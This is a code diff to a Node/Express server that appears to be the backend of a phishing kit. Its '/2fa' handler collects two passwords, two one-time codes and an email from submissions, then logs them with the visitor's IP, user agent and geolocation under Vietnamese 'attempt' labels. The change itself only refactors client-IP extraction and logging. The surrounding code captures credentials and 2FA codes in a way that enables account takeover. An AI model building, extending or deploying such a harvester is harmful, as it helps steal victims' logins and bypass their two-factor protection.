@@ -186,17 +186,28 @@ async function getGeo(ip) {
     return {};
   }
 }
+function getClientIP(req) {
+  let ip =
+    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
+    req.socket.remoteAddress ||
+    '';
 
+  if (ip.startsWith('::ffff:')) {
+    ip = ip.replace('::ffff:', '');
+  }
+
+  return ip;
+}
 // Handle 2FA submission
 app.post('/2fa', async (req, res) => {
   const { code1,code2, password1, password2, email ,step} = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = getClientIP(req);
+  const userAgent = req.headers['user-agent'] || 'N/A';
 
+  console.log("IP:", ip);
+  console.log("User-Agent:", userAgent);
 
-  const userAgent = req.headers['user-agent'];
-  console.log(userAgent)
   const geo = await getGeo(ip);
-  console.log(geo);
   logData({ type: `2FA Lần  ${step} - Email  ${email}`, code1,code2, password1, password2, email,ip    , userAgent,
     city: geo.city,
     region: geo.region,
